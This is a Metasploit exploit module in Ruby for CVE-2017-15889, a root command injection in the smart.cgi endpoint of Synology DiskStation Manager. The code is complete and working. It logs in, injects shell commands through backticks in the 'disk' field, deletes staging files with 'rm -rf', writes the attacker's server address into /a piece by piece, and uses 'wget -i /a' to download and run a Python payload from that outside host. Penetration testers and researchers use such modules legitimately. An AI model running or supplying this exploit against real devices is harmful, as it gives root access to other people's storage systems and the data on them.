# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer
  include Msf::Exploit::FileDropper

  DEVICE_INFO_PATTERN = /major=(?<major>\d+)&minor=(?<minor>\d+)&build=(?<build>\d+)
                        &junior=\d+&unique=synology_\w+_(?<model>[^&]+)/x.freeze

  def initialize(info = {})
    super(
      update_info(
        info,
        &#039;Name&#039; => &#039;Synology DiskStation Manager smart.cgi Remote Command Execution&#039;,
        &#039;Description&#039; => %q{
          This module exploits a vulnerability found in Synology DiskStation Manager (DSM)
          versions < 5.2-5967-5, which allows the execution of arbitrary commands under root
          privileges after website authentication.
          The vulnerability is located in webman/modules/StorageManager/smart.cgi, which
          allows appending of a command to the device to be scanned.  However, the command
          with drive is limited to 30 characters.  A somewhat valid drive name is required,
          thus /dev/sd is used, even though it doesn&#039;t exist.  To circumvent the character
          restriction, a wget input file is staged in /a, and executed to download our payload
          to /b.  From there the payload is executed.  A wfsdelay is required to give time
          for the payload to download, and the execution of it to run.
        },
        &#039;Author&#039; =>
          [
            &#039;Nigusu Kassahun&#039;, # Discovery
            &#039;h00die&#039; # metasploit module
          ],
        &#039;References&#039; =>
          [
            [ &#039;CVE&#039;, &#039;2017-15889&#039; ],
            [ &#039;EDB&#039;, &#039;43190&#039; ],
            [ &#039;URL&#039;, &#039;https://ssd-disclosure.com/ssd-advisory-synology-storagemanager-smart-cgi-remote-command-execution/&#039; ],
            [ &#039;URL&#039;, &#039;https://synology.com/en-global/security/advisory/Synology_SA_17_65_DSM&#039; ]
          ],
        &#039;Privileged&#039; => true,
        &#039;Stance&#039; => Msf::Exploit::Stance::Aggressive,
        &#039;Platform&#039; => [&#039;python&#039;],
        &#039;Arch&#039; => [ARCH_PYTHON],
        &#039;Targets&#039; =>
          [
            [&#039;Automatic&#039;, {}]
          ],
        &#039;DefaultTarget&#039; => 0,
        &#039;DefaultOptions&#039; => {
          &#039;PrependMigrate&#039; => true,
          &#039;WfsDelay&#039; => 10
        },
        &#039;License&#039; => MSF_LICENSE,
        &#039;DisclosureDate&#039; => &#039;Nov 08 2017&#039;
      )
    )

    register_options(
      [
        Opt::RPORT(5000),
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The URI of the Synology Website&#039;, &#039;/&#039;]),
        OptString.new(&#039;USERNAME&#039;, [true, &#039;The Username for Synology&#039;, &#039;admin&#039;]),
        OptString.new(&#039;PASSWORD&#039;, [true, &#039;The Password for Synology&#039;, &#039;&#039;])
      ]
    )

    register_advanced_options [
      OptBool.new(&#039;ForceExploit&#039;, [false, &#039;Override check result&#039;, false])
    ]
  end

  def check
    vprint_status(&#039;Trying to detect installed version&#039;)

    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;webman&#039;, &#039;info.cgi&#039;),
      &#039;vars_get&#039; => { &#039;host&#039; => &#039;&#039; }
    })

    if res && (res.code == 200) && res.body =~ DEVICE_INFO_PATTERN
      version = "#{$LAST_MATCH_INFO[:major]}.#{$LAST_MATCH_INFO[:minor]}"
      build = $LAST_MATCH_INFO[:build]
      model = $LAST_MATCH_INFO[:model].sub(/^[a-z]+/) { |s| s[0].upcase }
      model = "DS#{model}" unless model =~ /^[A-Z]/
    else
      vprint_error(&#039;Detection failed&#039;)
      return CheckCode::Unknown
    end

    vprint_status("Model #{model} with version #{version}-#{build} detected")

    case version
    when &#039;3.0&#039;, &#039;4.0&#039;, &#039;4.1&#039;, &#039;4.2&#039;, &#039;4.3&#039;, &#039;5.0&#039;, &#039;5.1&#039;
      return CheckCode::Appears
    when &#039;5.2&#039;
      return CheckCode::Appears if build < &#039;5967-5&#039;
    end

    CheckCode::Safe
  end

  def on_request_uri(cli, _request, cookie, token)
    print_good(&#039;HTTP Server request received, sending payload&#039;)
    send_response(cli, payload.encoded)
    print_status(&#039;Executing payload&#039;)
    inject_request(cookie, token, &#039;python b&#039;)
  end

  def inject_request(cookie, token, cmd = &#039;&#039;)
    send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;webman&#039;, &#039;modules&#039;, &#039;StorageManager&#039;, &#039;smart.cgi&#039;),
      &#039;cookie&#039; => cookie,
      &#039;headers&#039; => {
        &#039;X-SYNO-TOKEN&#039; => token
      },
      &#039;vars_post&#039; => {
        &#039;action&#039; => &#039;apply&#039;,
        &#039;operation&#039; => &#039;quick&#039;,
        &#039;disk&#039; => "/dev/sd`#{cmd}`"
      }
    })
  end

  def login
    # If you try to debug login through the browser, you&#039;ll see that desktop.js calls
    # ux-all.js to do an RSA encrypted login.
    # Wowever in a stroke of luck Mrs. h00die caused
    # a power sag while tracing/debugging the loging, causing the NAS to power off.
    # when that happened, it failed to get the crypto vars, and defaulted to a
    # non-encrypted login, which seems to work just fine.  greetz Mrs. h00die!

    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;webman&#039;, &#039;login.cgi&#039;),
      &#039;vars_get&#039; => { &#039;enable_syno_token&#039; => &#039;yes&#039; },
      &#039;vars_post&#039; => {
        &#039;username&#039; => datastore[&#039;USERNAME&#039;],
        &#039;passwd&#039; => datastore[&#039;PASSWORD&#039;],
        &#039;OTPcode&#039; => &#039;&#039;,
        &#039;__cIpHeRtExT&#039; => &#039;&#039;,
        &#039;client_time&#039; => Time.now.to_i,
        &#039;isIframeLogin&#039; => &#039;yes&#039;
      }
    })
    if res && %r{<div id=&#039;synology&#039;>(?<json>.*)</div>}m =~ res.body
      result = JSON.parse(json)

      fail_with(Failure::BadConfig, &#039;Incorrect Username/Password&#039;) if result[&#039;result&#039;] == &#039;error&#039;
      if result[&#039;result&#039;] == &#039;success&#039;
        return res.get_cookies, result[&#039;SynoToken&#039;]
      end

      fail_with(Failure::Unknown, "Unknown response: #{result}")
    end
  end

  def exploit
    unless check == CheckCode::Appears
      unless datastore[&#039;ForceExploit&#039;]
        fail_with Failure::NotVulnerable, &#039;Target is not vulnerable. Set ForceExploit to override.&#039;
      end
      print_warning &#039;Target does not appear to be vulnerable&#039;
    end

    if datastore[&#039;SRVHOST&#039;] == &#039;0.0.0.0&#039;
      fail_with(Failure::BadConfig, &#039;SRVHOST must be set to an IP address (0.0.0.0 is invalid) for exploitation to be successful&#039;)
    end

    begin
      print_status(&#039;Attempting Login&#039;)
      cookie, token = login

      start_service({ &#039;Uri&#039; => {
        &#039;Proc&#039; => proc do |cli, req|
          on_request_uri(cli, req, cookie, token)
        end,
        &#039;Path&#039; => &#039;/&#039;
      } })

      print_status(&#039;Cleaning env&#039;)
      inject_request(cookie, token, cmd = &#039;rm -rf /a&#039;)
      inject_request(cookie, token, cmd = &#039;rm -rf b&#039;)
      command = "#{datastore[&#039;SRVHOST&#039;]}:#{datastore[&#039;SRVPORT&#039;]}".split(//)
      command_space = 22 - "echo -n &#039;&#039;>>/a".length
      command_space -= 1
      command.each_slice(command_space) do |a|
        a = a.join(&#039;&#039;)
        vprint_status("Staging wget with: echo -n &#039;#{a}&#039;>>/a")
        inject_request(cookie, token, cmd = "echo -n &#039;#{a}&#039;>>/a")
      end
      print_status(&#039;Requesting payload pull&#039;)
      register_file_for_cleanup(&#039;/usr/syno/synoman/webman/modules/StorageManager/b&#039;)
      register_file_for_cleanup(&#039;/a&#039;)
      inject_request(cookie, token, cmd = &#039;wget -i /a -O b&#039;)
      # at this point we let the HTTP server call the last stage
      # wfsdelay should be long enough to hold out for everything to download and run
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unreachable, "#{peer} - Could not connect to the web service")
    end

  end
end

